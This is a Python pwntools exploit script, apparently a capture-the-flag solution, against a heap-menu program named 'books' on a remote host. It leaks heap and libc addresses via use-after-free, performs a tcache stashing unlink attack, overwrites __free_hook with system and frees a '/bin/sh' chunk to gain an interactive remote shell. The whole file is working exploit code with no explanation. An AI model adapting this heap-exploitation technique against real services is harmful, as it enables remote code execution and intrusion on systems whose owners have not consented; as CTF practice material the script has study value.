#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./books')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('10.21.13.112', 10004)
    libc = ELF('./libc.so.6')

def intro(name):
    p.recvuntil('your name? ')
    p.send(name)
    sleep(0.1)

def cmd(c):
    p.recvuntil('choice: ')
    p.sendline(str(c))

def new(idx, sz, content):
    cmd(1)
    p.recvuntil('1st/2nd/3rd book? ')
    p.sendline(str(idx))
    p.recvuntil('your content?')
    p.sendline(str(sz))
    p.recvuntil('your content: ')
    p.send(content)
    sleep(0.1)
    p.recvuntil('receipt? [y/n] ')
    p.sendline('n')

def free(idx):
    cmd(2)
    p.recvuntil('1st/2nd/3rd book? ')
    p.sendline(str(idx))

def edit(idx, content):
    cmd(3)
    p.recvuntil('1st/2nd/3rd book? ')
    p.sendline(str(idx))
    p.recvuntil('your content: ')
    p.send(content)
    sleep(0.1)

def show(idx):
    cmd(4)
    p.recvuntil('1st/2nd/3rd book? ')
    p.sendline(str(idx))
    p.recvuntil('Hi, ')
    name = p.recvuntil('!', drop=True)
    p.recvuntil(': ')
    data = p.recvuntil('\n', drop=True)
    return name, data

def secret(data):
    cmd(0xdeadbeef)
    p.send(data)
    sleep(0.1)

intro('b3ale')
for i in range(5):
    new(1, 0xf8, '1')
    free(1) # fillup tcache 0x100
# leak heap
new(1, 0x408, '1')
new(2, 0x408, '2')
free(1)
free(2)
name, data = show(2)
heap_base = u64(data.ljust(8, b'\x00')) - 0x7d0
info('heap_base = ' + hex(heap_base))
#raw_input('@')

# leak libc
for i in range(5):
    new(1, 0x408, '1')
    free(1) # fillup tcache 0x400
new(1, 0x408, '1')
new(2, 0x408, '2') # padding
free(1)
name, data = show(1)
libc_base = u64(data.ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))
#raw_input('@')

'''
for i in range(2):
    new(2, 0x408, '2')
    new(3, 0x408, '3') # padding
    free(2) # put into unsortedbin
    new(3, 0x308, '3') # trigger consolidate
    new(3, 0x108, '3') # put into smallbins 0x100
'''
for i in range(3):
    new(2, 0x408, '2')
    new(3, 0x408, '3') # padding
    free(2) # put into unsortedbin
    new(3, 0x308, '3') # trigger consolidate
#raw_input('@')
new(1, 0x233, '1')
free(1) # put into tcache 0x240
target = heap_base + 0x54
payload = b'\x00' * 0x308 + p64(0x101) + p64(heap_base + 0x2740) + p64(target - 0x10)
edit(2, payload) # overwrite smallbins' bk
new(2, 0xf8, '2') # trigger tcache stashing unlink
#raw_input('@')

system_addr = libc_base + libc.symbols['system']
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
free_hook_addr = libc_base + libc.symbols['__free_hook']
edit(1, p64(free_hook_addr)) # overwrite tcache 0x240's fd
#raw_input('@')
secret('x')
secret(p64(system_addr)) # get __free_hook & change to system
new(3, 0x408, '/bin/sh\x00')
free(3) # call system("/bin/sh\x00");
p.interactive("📖 >  ")

